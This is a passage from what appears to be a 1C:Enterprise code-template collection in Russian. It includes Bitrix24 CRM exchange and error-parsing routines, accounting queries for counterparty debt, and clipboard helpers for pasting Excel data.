			СтруктураОтвета2 = СтруктураОтвета.Получить(""result"");
			
			Если СтруктураОтвета2.Получить(""result"") <> Неопределено тогда
				
				Для каждого ТекСтрока из СтруктураОтвета2.Получить(""result"") Цикл
					
					Если ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Товар тогда
						лОбъект = Б24_ОбменСПорталомВызовСервера.ПолучитьНоменклатуруИХарактеристикуПоВнешнемуИдентификатору(ТекСтрока.Ключ);	
					Иначе
						лОбъект = Б24_ОбменСПорталомВызовСервера.ПолучитьЗначениеПоXML(ТипОбъекта, ТекСтрока.Ключ);	
					КонецЕсли;
					
					Если НЕ ЗначениеЗаполнено(лОбъект) тогда
						ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Ошибка, ""Не найден объект с ид:"" + Строка(ТекСтрока.Ключ));  
						ОбщиеНастройки.ВыполненоБезОшибок = Ложь;
					Иначе
						Если ТипЗнч(ТекСтрока.Значение) <> Тип(""Булево"") ИЛИ ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.ЮрАдресРеквизита 
							ИЛИ ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.ФактАдресРеквизита ТОГДА
							
								//Б24_ОбменСПорталомВызовСервера.ЗаписатьИдБ24Объекта(ОбщиеНастройки, ТипДанных, лОбъект, ТекСтрока.Значение);  
								//Б24_ОбменСПорталомВыгрузкаВызовСервера.УдалениеЗаписиИзПакетаДаных(ОбщиеНастройки, Истина, ТипДанных, Пакет, лОбъект);
						Иначе
						
							Если ТекСтрока.Значение тогда		
								Б24_ОбменСПорталомВыгрузкаВызовСервера.УдалениеЗаписиИзПакетаДаных(ОбщиеНастройки, Истина, ТипДанных, Пакет, лОбъект);
							Иначе
								Б24_ОбменСПорталомВыгрузкаВызовСервера.УдалениеЗаписиИзПакетаДаных(ОбщиеНастройки, Ложь, ТипДанных, Пакет, лОбъект);
							КонецЕсли;
						
					КонецЕсли;
	
					КонецЕсли;
					
				КонецЦикла;
			КонецЕсли;
			
			Если СтруктураОтвета2.Получить(""result_error"") <> Неопределено тогда
				
				Для каждого ТекСтрока из СтруктураОтвета2.Получить(""result_error"") Цикл
					
					лОписаниеОшибки = ТекСтрока.Значение.Получить(""error_description"");
					
					Если ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Товар тогда
						лОбъект = Б24_ОбменСПорталомВызовСервера.ПолучитьНоменклатуруИХарактеристикуПоВнешнемуИдентификатору(ТекСтрока.Ключ);	
					Иначе
						лОбъект = Б24_ОбменСПорталомВызовСервера.ПолучитьЗначениеПоXML(ТипОбъекта, ТекСтрока.Ключ);	
					КонецЕсли;
					
					Если НЕ ЗначениеЗаполнено(лОбъект) тогда
						ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Ошибка, лОписаниеОшибки + "" у не найденного объекта с ид:"" + Строка(ТекСтрока.Ключ));   
					Иначе
						ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Ошибка, лОписаниеОшибки + "" у объекта:"" + Строка(лОбъект));   
						РазобратьОшибку(ОбщиеНастройки, ТипДанных, лОбъект, лОписаниеОшибки);
					КонецЕсли;	
					
					Б24_ОбменСПорталомВыгрузкаВызовСервера.УдалениеЗаписиИзПакетаДаных(ОбщиеНастройки, Ложь, ТипДанных, Пакет, лОбъект);
					
					ОбщиеНастройки.ВыполненоБезОшибок = Ложь;
					
				КонецЦикла;
				
			КонецЕсли;
		Иначе
			ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Ошибка, ""Не удалось разобрать JSON ответа"");
			ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Ошибка, ""Тело отправляемого запроса: "" + ТелоHTTPЗапроса);
			
			ОбщиеНастройки.ВыполненоБезОшибок = Ложь;

		КонецЕсли;
		
	КонецЕсли;
	
КонецПроцедуры

Процедура РазобратьОшибку(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки)
	
	Если ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Компания тогда
		
		Если Найти(ОписаниеОшибки, ""Company is not found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 тогда	
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
			Возврат;
		КонецЕсли;
		                                                               
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Контакт тогда
		
		Если Найти(ОписаниеОшибки, ""Contact is not found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 тогда	
			
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
			Возврат;
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Реквизит тогда
		
		Если (Найти(ОписаниеОшибки, ""The Requisite with ID"") > 0 И Найти(ОписаниеОшибки, "" is not found"") > 0) ИЛИ  Найти(ОписаниеОшибки, ""не найден"") > 0 тогда	
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
			Возврат;
		КонецЕсли;
		
		Если Найти(ОписаниеОшибки, ""ENTITY_ID is not defined or invalid."") > 0 тогда
			Если ЗначениеЗаполнено(Объект) тогда
				Б24_ОбменСПорталомРегистрацияИзмененийВызовСервера.ЗарегистрироватьИзмененияВладельцевДанных(ТипДанных, Объект);
			КонецЕсли;
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.ЮрАдресРеквизита ИЛИ ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.ФактАдресРеквизита тогда
		
		Если Найти(ОписаниеОшибки, ""Type"") > 0 И Найти(ОписаниеОшибки, "" exists."") > 0 тогда	
			ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Информация, ""Помечаем, что такой адрес уже был выгружен."");
			Б24_ОбменСПорталомВызовСервера.ЗаписатьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, Истина);  
			Возврат;
		ИначеЕсли Найти(ОписаниеОшибки, ""Type"") > 0 И Найти(ОписаниеОшибки, "" not found."") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		ИначеЕсли Найти(ОписаниеОшибки, ""ENTITY_ID is not defined or invalid"") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
			
			Если ЗначениеЗаполнено(Объект) тогда
				Б24_ОбменСПорталомРегистрацияИзмененийВызовСервера.ЗарегистрироватьИзмененияВладельцевДанных(ТипДанных, Объект);
			КонецЕсли;
			
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.БанковскийСчетРеквизита тогда
		
		Если Найти(ОписаниеОшибки, ""ot found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 ИЛИ Найти(ОписаниеОшибки, ""Access denied"") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		КонецЕсли;
		
		Если Найти(ОписаниеОшибки, ""ENTITY_ID is not defined or invalid."") > 0 тогда
			
			Если ЗначениеЗаполнено(Объект) тогда
				Б24_ОбменСПорталомРегистрацияИзмененийВызовСервера.ЗарегистрироватьИзмененияВладельцевДанных(ТипДанных, Объект);
			КонецЕсли;
			
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.ГруппаТовара тогда
		
		Если Найти(ОписаниеОшибки, ""ot found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден."") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		КонецЕсли;
		
		Если Найти(ОписаниеОшибки, ""Неверный раздел-родитель"") > 0 тогда
			ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Информация, ""Ид родителя был изменен. Нужно сдалать повторную вырузку элемента."");
		КонецЕсли;
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Товар тогда
		
		Если Найти(ОписаниеОшибки, ""ot found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""Access denied"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0  тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.ЕдиницаИзмерения тогда
		
		Если Найти(ОписаниеОшибки, ""ot found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""Access denied"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		ИначеЕсли Найти(ОписаниеОшибки, ""already exists."") > 0 тогда
			ДобавитьВЛогИОповестить(ОбщиеНастройки,  ОбщиеНастройки.ВаринтыОшибок.Информация, ""Уже есть единица измерения с кодом указанным ранее. Нужно перепривязать элементы. Например повторно выгрузив с Б24"");
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.СвойствоТовара тогда
		
		Если Найти(ОписаниеОшибки, ""ot found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""Access denied"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки); 
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Счет тогда
		
		Если Найти(ОписаниеОшибки, ""ot found."") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.Сделка тогда
		
		Если Найти(ОписаниеОшибки, ""ot found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		КонецЕсли;
		
	ИначеЕсли ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.СвойствоКомпании 
		ИЛИ ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.СвойствоКонтакта
		ИЛИ ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.СвойствоСчета
		ИЛИ ТипДанных = ОбщиеНастройки.ТипыОбъектовОбмена.СвойствоСделки тогда
		
		Если Найти(ОписаниеОшибки, ""ot found"") > 0 ИЛИ Найти(ОписаниеОшибки, ""не найден"") > 0 тогда
			Б24_ОбменСПорталомВызовСервера.УдалитьИдБ24Объекта(ОбщиеНастройки, ТипДанных, Объект, ОписаниеОшибки);  
		КонецЕсли;
		
	КонецЕсли;
	   
КонецПроцедуры

Процедура ДобавитьВЛогИОповестить(ОбщиеНастройки, ВаринтОшибки, ТекстСообщения) Экспорт
	
#ЕСЛИ НЕ СЕРВЕР ИЛИ ТолстыйКлиентУправляемоеПриложение  ТОГДА 	
	Состояние(ТекстСообщения);
#КОНЕЦЕСЛИ

	Б_Логирование.ДобавитьВЛог(ОбщиеНастройки, ВаринтОшибки,  ТекстСообщения);  
	
КонецПроцедуры

Функция СтруктураПараметров(СтрокаТаблицы)
	
	ПараметрыОбработки = Новый Структура; // Все данные, которые с Клиента надо отправить на Сервер
	
	ПараметрыОбработки.Вставить(""Объект""		, 	СтрокаТаблицы.Объект);
	ПараметрыОбработки.Вставить(""Идентификатор""	, 	СтрокаТаблицы.Идентификатор);
	ПараметрыОбработки.Вставить(""НеАктуально""	, 	СтрокаТаблицы.НеАктуально);
	//ПараметрыОбработки.Вставить(""СотрудникПодходящий""	, 	СтрокаТаблицы.СотрудникПодходящий);
	//
	//// Здесь же можно задавать параметры от разных кнопок обработки, чтобы всё проделать в одной процедуре
	//ПараметрыОбработки.Вставить(""ПерепровестиДвижения""	, 	Неопределено);
	
	Возврат ПараметрыОбработки;
	
КонецФункции // СтруктураПараметров() 


Функция ОбработкаСтрокТаблицы(СтрокаТаблицы)
	
	лРезультат 	= Неопределено;
	// Здесь подготавливаются данные перед отправкой на сервер. Проверяются условия данных.
	
	// К программно сгенерированным колонкам можно нормально обращаться по имени, напр, ""СтрокаТаблицы.Ссылка""
	ПараметрыОбработки = СтруктураПараметров(СтрокаТаблицы);
	
	СтрокаТаблицыНомерСтроки = СтрокаТаблицы.НомерСтроки;
	
	Если ПропускатьОшибки Тогда
		
		Попытка
			
			лРезультат 	= ОбработкаСтрокТаблицыНаСервереБезКонтекста(СтрокаТаблицыНомерСтроки, ПараметрыОбработки, ТестовыйРежим); 
			
		Исключение
			Сообщить(""Ошибка при обработке строки № "" + СтрокаТаблицыНомерСтроки + "": "" + ОписаниеОшибки(), СтатусСообщения.Важное);
		КонецПопытки; 
		
	Иначе
		лРезультат 	= ОбработкаСтрокТаблицыНаСервереБезКонтекста(СтрокаТаблицыНомерСтроки, ПараметрыОбработки, ТестовыйРежим); 
	КонецЕсли; 
	
	Возврат лРезультат;
	
КонецФункции


Функция ОбработкаСтрокТаблицыНаСервереБезКонтекста(СтрокаТаблицыНомерСтроки, ПараметрыОбработки, ТестовыйРежим)
	
	//ВыбранныйОбъектСсылка 	= ПараметрыОбработки.Объект;
	//ВыбранныйОбъект 		= ВыбранныйОбъектРегистратор.ПолучитьОбъект();
	
	// Изменения объекта
	// ПрисвоитьЗначение(ЧемуПрисвоить, ЧтоПрисвоить, ТестовыйРежим = Ложь, ДопТекстВНачалеСообщения = """", ДопТекстВКонцеСообщения = """")
	ИнфоСтроки = ""Строка № "" + СтрокаТаблицыНомерСтроки + "" "";
	
	//Отправим запрос на сервер с присвоением неактивности
	Возврат ВыполнитьЗапросНаБ24(ПараметрыОбработки.Объект, ПараметрыОбработки.Идентификатор, ПараметрыОбработки.НеАктуально);
	 
	
	//лВыбранныйОбъектДвиженияСИЗ = ВыбранныйОбъект.Движения.ДвиженияСИЗ.Прочитать();
	
	//ПрисвоитьЗначение(ВыбранныйОбъект.Ссылка, """", ТестовыйРежим, ИнфоСтроки);
	
	// Запись объекта, приминение изменений
	//ЗаписатьОбъект(ВыбранныйОбъект,, ТестовыйРежим);
	
КонецФункции

Функция ВыполнитьЗапросНаБ24(пСсылка, пИдентификаторБ24, пНеАктуально)
	
	Поля = Новый Структура;
	
	Поля.Вставить(""UF_CRM_1558443033""	, Формат(пНеАктуально, ""БЛ=0; БИ=1"")); //Дополнительное поле контакта ""НЕАКТУАЛЬНО""
	
	ТелоЗапроса = """";
	
	Для каждого ТекПоле из Поля Цикл
		
		ТелоЗапроса = ТелоЗапроса + ?(СтрДлина(ТелоЗапроса) >0, ""&"", """") +""fields[""+ ТекПоле.Ключ + ""]="" + КодироватьСтроку(XMLСтрока(ТекПоле.Значение), СпособКодированияСтроки.КодировкаURL, ""UTF8""); 
		
	КонецЦикла;                                                                     
	
	СтрокаЗапроса = ""cmd[""+ XMLСтрока(пСсылка) + ""]="" +  КодироватьСтроку(""crm.contact.update?id="" + пИдентификаторБ24 + ""&""  + ТелоЗапроса, СпособКодированияСтроки.КодировкаURL, ""UTF8"");	
	
	Возврат СтрокаЗапроса;
	
КонецФункции
"}
}
}
},
{1,
{"Счета",1,0,"",""},
{3,
{"Задолженность",1,0,"",""},
{0,
{"ПолучитьЗадолженность",0,0,"","Функция ПолучитьЗадолженность(Контрагент)
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ХозрасчетныйОстатки.СуммаОстатокДт КАК СуммаОстатокДт,
	|	ХозрасчетныйОстатки.СуммаОстатокКт КАК СуммаОстатокКт,
	|	ХозрасчетныйОстатки.СуммаОстатокДт - ХозрасчетныйОстатки.СуммаОстатокКт КАК ДтМинусКт
	|ПОМЕСТИТЬ ВТ_Счета
	|ИЗ
	|	РегистрБухгалтерии.Хозрасчетный.Остатки(, Счет В ИЕРАРХИИ (ЗНАЧЕНИЕ(ПланСчетов.Хозрасчетный.РасчетыСПокупателямиИЗаказчиками)), , Субконто1 = &Контрагент) КАК ХозрасчетныйОстатки
	|
	|ОБЪЕДИНИТЬ ВСЕ
	|
	|ВЫБРАТЬ ПЕРВЫЕ 1
	|	ХозрасчетныйОстатки.СуммаОстатокДт,
	|	ХозрасчетныйОстатки.СуммаОстатокКт,
	|	ХозрасчетныйОстатки.СуммаОстатокДт - ХозрасчетныйОстатки.СуммаОстатокКт
	|ИЗ
	|	РегистрБухгалтерии.Хозрасчетный.Остатки(, Счет В ИЕРАРХИИ (ЗНАЧЕНИЕ(ПланСчетов.Хозрасчетный.РасчетыСПоставщикамиИПодрядчиками)), , Субконто1 = &Контрагент) КАК ХозрасчетныйОстатки
	|;
	|
	|////////////////////////////////////////////////////////////////////////////////
	|ВЫБРАТЬ
	|	СУММА(ВТ_Счета.ДтМинусКт) КАК ДтМинусКт
	|ИЗ
	|	ВТ_Счета КАК ВТ_Счета"";
	
	//Запрос.УстановитьПараметр(""Договор"", Договор);
	Запрос.УстановитьПараметр(""Контрагент"", Контрагент);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			Возврат ВыборкаДетальныеЗаписи.ДтМинусКт;
		КонецЕсли;
	КонецЕсли;
	
	Возврат Неопределено;
	
КонецФункции // ПолучитьЗадолженность()
"}
},
{0,
{"ПолучитьЗадолженностьПоДоговору",0,0,"","Функция ПолучитьЗадолженностьПоДоговору(Контрагент, Договор)
	
	Запрос = Новый Запрос;
	Запрос.Текст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ХозрасчетныйОстатки.СуммаОстатокДт КАК СуммаОстатокДт,
	|	ХозрасчетныйОстатки.СуммаОстатокКт КАК СуммаОстатокКт,
	|	ХозрасчетныйОстатки.СуммаОстатокДт - ХозрасчетныйОстатки.СуммаОстатокКт КАК ДтМинусКт
	|ПОМЕСТИТЬ ВТ_Счета
	|ИЗ
	|	РегистрБухгалтерии.Хозрасчетный.Остатки(
	|			,
	|			Счет В ИЕРАРХИИ (ЗНАЧЕНИЕ(ПланСчетов.Хозрасчетный.РасчетыСПокупателямиИЗаказчиками)),
	|			,
	|			Субконто1 = &Контрагент
	|				И Субконто2 = &Договор) КАК ХозрасчетныйОстатки
	|
	|ОБЪЕДИНИТЬ ВСЕ
	|
	|ВЫБРАТЬ ПЕРВЫЕ 1
	|	ХозрасчетныйОстатки.СуммаОстатокДт,
	|	ХозрасчетныйОстатки.СуммаОстатокКт,
	|	ХозрасчетныйОстатки.СуммаОстатокДт - ХозрасчетныйОстатки.СуммаОстатокКт
	|ИЗ
	|	РегистрБухгалтерии.Хозрасчетный.Остатки(
	|			,
	|			Счет В ИЕРАРХИИ (ЗНАЧЕНИЕ(ПланСчетов.Хозрасчетный.РасчетыСПоставщикамиИПодрядчиками)),
	|			,
	|			Субконто1 = &Контрагент
	|				И Субконто2 = &Договор) КАК ХозрасчетныйОстатки
	|;
	|
	|////////////////////////////////////////////////////////////////////////////////
	|ВЫБРАТЬ
	|	СУММА(ВТ_Счета.ДтМинусКт) КАК ДтМинусКт
	|ИЗ
	|	ВТ_Счета КАК ВТ_Счета"";
	
	Запрос.УстановитьПараметр(""Договор"", Договор);
	Запрос.УстановитьПараметр(""Контрагент"", Контрагент);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			Возврат ВыборкаДетальныеЗаписи.ДтМинусКт;
		КонецЕсли;
	КонецЕсли;
	
	Возврат Неопределено;
	
КонецФункции // ПолучитьЗадолженностьПоДоговору()
"}
},
{0,
{"ПолучитьЗадолженностьПоДоговоруУниверсально",0,0,"","Функция ПолучитьЗадолженностьПоДоговоруУниверсально(Контрагент, Договор = Неопределено)
	
	Запрос = Новый Запрос;
	ЗапросТекст = 
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ХозрасчетныйОстатки.СуммаОстатокДт КАК СуммаОстатокДт,
	|	ХозрасчетныйОстатки.СуммаОстатокКт КАК СуммаОстатокКт,
	|	ХозрасчетныйОстатки.СуммаОстатокДт - ХозрасчетныйОстатки.СуммаОстатокКт КАК ДтМинусКт
	|ПОМЕСТИТЬ ВТ_Счета
	|ИЗ
	|	РегистрБухгалтерии.Хозрасчетный.Остатки(
	|			,
	|			Счет В ИЕРАРХИИ (ЗНАЧЕНИЕ(ПланСчетов.Хозрасчетный.РасчетыСПокупателямиИЗаказчиками)),
	|			,
	|			Субконто1 = &Контрагент
	|				И &УчестьДоговор) КАК ХозрасчетныйОстатки
	|
	|ОБЪЕДИНИТЬ ВСЕ
	|
	|ВЫБРАТЬ ПЕРВЫЕ 1
	|	ХозрасчетныйОстатки.СуммаОстатокДт,
	|	ХозрасчетныйОстатки.СуммаОстатокКт,
	|	ХозрасчетныйОстатки.СуммаОстатокДт - ХозрасчетныйОстатки.СуммаОстатокКт
	|ИЗ
	|	РегистрБухгалтерии.Хозрасчетный.Остатки(
	|			,
	|			Счет В ИЕРАРХИИ (ЗНАЧЕНИЕ(ПланСчетов.Хозрасчетный.РасчетыСПоставщикамиИПодрядчиками)),
	|			,
	|			Субконто1 = &Контрагент
	|				И &УчестьДоговор) КАК ХозрасчетныйОстатки
	|;
	|
	|////////////////////////////////////////////////////////////////////////////////
	|ВЫБРАТЬ
	|	СУММА(ВТ_Счета.ДтМинусКт) КАК ДтМинусКт
	|ИЗ
	|	ВТ_Счета КАК ВТ_Счета"";
	
	Если ЗначениеЗаполнено(Договор) Тогда
		Запрос.Текст = СтрЗаменить(ЗапросТекст, ""И &УчестьДоговор"", ""И Субконто2 = &Договор"");
		Запрос.УстановитьПараметр(""Договор"", Договор);
	Иначе
		Запрос.Текст = СтрЗаменить(ЗапросТекст, ""И &УчестьДоговор"", """");
	КонецЕсли; 
	
	Запрос.УстановитьПараметр(""Контрагент"", Контрагент);
	
	РезультатЗапроса = Запрос.Выполнить();
	
	Если НЕ РезультатЗапроса.Пустой() Тогда
		ВыборкаДетальныеЗаписи = РезультатЗапроса.Выбрать();
		Если ВыборкаДетальныеЗаписи.Следующий() Тогда
			Возврат ВыборкаДетальныеЗаписи.ДтМинусКт;
		КонецЕсли;
	КонецЕсли;
	
	Возврат Неопределено;
	
КонецФункции // ПолучитьЗадолженностьПоДоговоруУниверсально()"}
}
}
},
{4,
{"Буфер обмена",1,0,"",""},
{0,
{"Копирование из Эксель",0,0,"","//Для рабочего стола контент-менеджера понадобилось обеспечить перенос данных из Excel в 1с через буфер обмена.
//Чтобы получить данные из буфера можно воспользоваться COM-Объектом htmlfile. Если скопировать ячейки Excel в буфер обмена то строки будут разделены символами перевода строки, а колонки будут отделяться знаком табуляции.
//Ниже код с примером загрузки данных в таблицу из буфера 

Функция ПолучитьТекстИзБуфераОбмена() Экспорт
	
	#Если Клиент Тогда
		Объект = Новый COMОбъект(""htmlfile"");
		Возврат Объект.ParentWindow.ClipboardData.Getdata(""Text"");
	#КонецЕсли
	
КонецФункции

Процедура ЗапонитьОчередьСБуфера()
	
	ДанныеБуфера = ПолучитьТекстИзБуфераОбмена();
	
	Если СокрЛП(ДанныеБуфера) = """" Тогда
		Сообщить(""Буфер пуст!!!"");
		Возврат;
	КонецЕсли;
	НайденыйСимвол = Найти(ДанныеБуфера,""""+Символы.Таб+""""+Символы.Таб);
	
	//{{ проверка на пустые колонки
	Если НайденыйСимвол <> 0 Тогда
		МассивСтрок = ОбщегоНазначения.РазложитьСтрокуВМассивПодстрок(ДанныеБуфера, Символы.ПС);
		НеВоВсехСтроках = истина;
		Для Каждого СтрокаБуфера из МассивСтрок Цикл 
			НайденыйСимволСтрока = Найти(СтрокаБуфера,""""+Символы.Таб+""""+Символы.Таб);
			
			Если НайденыйСимволСтрока = 0 Тогда
				НеВоВсехСтроках = Ложь;
			КонецЕсли;
		КонецЦикла;
		
		Пока Найти(ДанныеБуфера,""""+Символы.Таб+""""+Символы.Таб) <> 0 Цикл
			ДанныеБуфера = СтрЗаменить(ДанныеБуфера,""""+Символы.Таб+""""+Символы.Таб,Символы.Таб);
		КонецЦикла; 
	КонецЕсли;
	//}} проверка на пустые колонки
	
	МассивСтрок = ОбщегоНазначения.РазложитьСтрокуВМассивПодстрок(ДанныеБуфера, Символы.ПС);
	
	Для Каждого СтрокаБуфера из МассивСтрок Цикл 
		Если СокрЛП(СтрокаБуфера) = """" Тогда
			Продолжить;
		КонецЕсли;
		НовСтрока = ЗаполняемаяТаблица.Добавить();
		МассивПодСтрок = ОбщегоНазначения.РазложитьСтрокуВМассивПодстрок(СтрокаБуфера, Символы.Таб);
		
		Сч = 0;
		Для Каждого ЗначениеКолонки Из  МассивПодСтрок Цикл
			Попытка
				Если ТипЗнч(НовСтрока[Сч]) = Тип(""Строка"") Тогда
					НовСтрока[Сч] = СокрЛП(ЗначениеКолонки);
				ИначеЕсли ТипЗнч(НовСтрока[Сч]) = Тип(""Число"") Тогда
					НовСтрока[Сч] = Число(СокрЛП(ЗначениеКолонки));
				ИначеЕсли ТипЗнч(НовСтрока[Сч]) = Тип(""Булево"") Тогда
					Если Найти(ЗначениеКолонки,""Да"") <> 0 Тогда
						НовСтрока[Сч] = Истина;
					иначе 
						НовСтрока[Сч] = Булево(СокрЛП(ЗначениеКолонки));
					КонецЕсли;
				Иначе 
					НайденыйСправоник = Неопределено;
					ТекТип = Строка(ТипЗнч(НовСтрока[Сч]));
					Для Каждого ТекСправоник ИЗ Метаданные.Справочники Цикл
						Если ТекСправоник.Синоним = СокрЛП(ТекТип) Тогда
							НайденыйСправоник = ТекСправоник;
							Прервать;
						КонецЕсли;
					КонецЦикла;
					Если НайденыйСправоник <> Неопределено Тогда
						НайденыйЭлемент = Справочники[НайденыйСправоник.Имя].НайтиПоНаименованию(СокрЛП(ЗначениеКолонки));
						НовСтрока[Сч] = НайденыйЭлемент;
					КонецЕсли;
				КонецЕсли;
			Исключение
			КонецПопытки;
			Сч = Сч+1;
		КонецЦикла;
	КонецЦикла;
	
КонецПроцедуры"}
},
{0,
{"COMОбъект(""htmlfile"")",0,0,"","&НаКлиенте
Функция ПолучитьТекстБуфераОбмена() Экспорт
	
	фОбъект = Новый COMОбъект(""htmlfile"");
	Возврат Объект.ParentWindow.ClipboardData.Getdata(""Text"");
	
КонецФункции

&НаКлиенте
Функция УстановитьТекстВБуферОбмена(Текст) Экспорт
	
	фОбъект = Новый COMОбъект(""htmlfile"");
	фОбъект.ParentWindow.ClipboardData.Setdata(""Text"", Текст);
	Возврат Текст;
	
КонецФункции   
"}
},
{0,
{"WScript",0,0,"","// через SendKeys передаем Ctrl-C и Ctrl-V    
wsh=СоздатьОбъект(""WScript.Shell""); 
// Скопировать текст     
wsh.SendKeys(""^c"");  // или так:  wsh.SendKeys(""^(C)"");          
// Вставить текст  
wsh.SendKeys(""^v"");  // или так:  wsh.SendKeys(""^(V)"");  

//Объект Clipboard
WshExtra = СоздатьОбъект(""WshExtra.Clipboard"");  
// Скопировать текст   
WshExtra.Copy(""Запись в буфер обмена"");
// Вставить текст 
Текст = WshExtra.Paste(); "}
},
{0,
{"COMОбъект(""htmlfile"") ОФ И УФ",0,0,"","Для Обычного приложения:

Процедура ЗаписатьТекстВБуферОбмена (пСтрока)
#Если Клиент Тогда
хОбъект = Новый COMОбъект(«htmlfile»);
хОбъект.ParentWindow.ClipboardData.Setdata(«Text», пСтрока);
Возврат;
#КонецЕсли
КонецПроцедуры

Функция ПолучитьТекстИзБуфераОбмена ()
Результат = Неопределено;
#Если Клиент Тогда
хОбъект = Новый COMОбъект(«htmlfile»);
Результат = хОбъект.ParentWindow.ClipboardData.Getdata(«Text»);
#КонецЕсли
Возврат Результат;
КонецФункции

Для Управляемого приложения:

&НаКлиенте
Процедура ЗаписатьТекстВБуферОбмена (пСтрока)
хОбъект = Новый COMОбъект(«htmlfile»);
хОбъект.ParentWindow.ClipboardData.Setdata(«Text», пСтрока);
Возврат;
КонецПроцедуры

&НаКлиенте
Функция ПолучитьТекстИзБуфераОбмена ()
Результат = Неопределено;
хОбъект = Новый COMОбъект(«htmlfile»);
Результат = хОбъект.ParentWindow.ClipboardData.Getdata(«Text»);
Возврат Результат;
КонецФункции"}
}
},
{16,
{"ТЧ и ТЗ",1,0,"",""},
{0,
{"ТЧ_НайтиСтроки",0,0,"НайтиС[трок]","ПараметрыОтбора 	= Новый Структура;
ПараметрыОтбора.Вставить(""Параметр""	, Значение);
